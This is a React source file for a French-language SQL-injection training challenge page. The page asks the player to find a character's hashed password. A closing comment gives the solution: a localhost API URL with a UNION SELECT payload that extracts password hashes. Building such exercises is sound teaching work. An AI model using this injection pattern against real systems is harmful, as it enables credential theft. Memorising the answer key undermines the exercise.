import React, { useEffect, useState } from "react"
import { Link } from "react-router-dom";
import { getCharacters } from "../../api";
import { Header, Hints } from "../../components";
import { routes } from "../../routes";

export { ChallengeSQLInjection1 }

type characterType = { id: number, name: string }

function ChallengeSQLInjection1() {
    const [characters, setCharacters] = useState<characterType[]>([]);

    useEffect(() => {
        getCharacters().then(({ data }) => {
            if (data) {
                setCharacters(data as characterType[])
            }
        })
    }, [])

    return <>
        <Header title="Challenge SQL Injection 1" />
        <p>Pour ce challenge, il s'agit de trouver la version hach√©e du mot de passe de M. Lermite</p>
        <Hints challengeName="challengeSQLInjection1" />
        ---------------------------
        <ul>
            {characters.map((character, index) => <li key={character.name + index}><Link to={routes["character"].getPath({ id: `${character.id}` })}>{character.name}</Link></li>)}
        </ul>
    </>

}

// Solution : http://localhost:3001/api/characters/16%20UNION%20SELECT%20id,%20hashedPassword%20FROM%20characters%20WHERE%20id=15